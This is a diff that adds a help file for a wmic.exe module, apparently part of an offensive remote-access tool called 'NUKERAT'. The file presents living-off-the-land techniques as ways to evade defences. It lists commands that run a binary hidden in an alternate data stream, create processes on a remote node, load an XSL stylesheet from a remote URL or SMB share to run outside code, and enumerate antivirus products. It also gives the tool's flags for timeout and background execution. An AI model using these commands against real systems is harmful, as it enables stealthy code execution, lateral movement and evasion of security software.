@@ -1,0 +1,31 @@
+ABOUT
+    The WMI command-line (WMIC) utility provides a command-line
+    interface for WMI. LOLBAS covers execute binary file hidden in
+    Alternate data streams to evade defensive counter measures,
+    execute binary from wmic to evade defensive counter measures,
+    and related techniques.
+
+USAGE:
+    wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
+    wmic.exe process call create "{CMD}"
+    wmic.exe /node:"192.168.0.1" process call create "{CMD}"
+    wmic.exe process get brief /format:"{REMOTEURL:.xsl}"
+    wmic.exe process get brief /format:"{PATH_SMB:.xsl}"
+    wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
+    WMIC.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState
+
+EXAMPLES:
+    wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
+    wmic.exe process call create "{CMD}"
+    wmic.exe /node:"192.168.0.1" process call create "{CMD}"
+    wmic.exe process get brief /format:"{REMOTEURL:.xsl}"
+    wmic.exe process get brief /format:"{PATH_SMB:.xsl}"
+    wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
+    WMIC.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
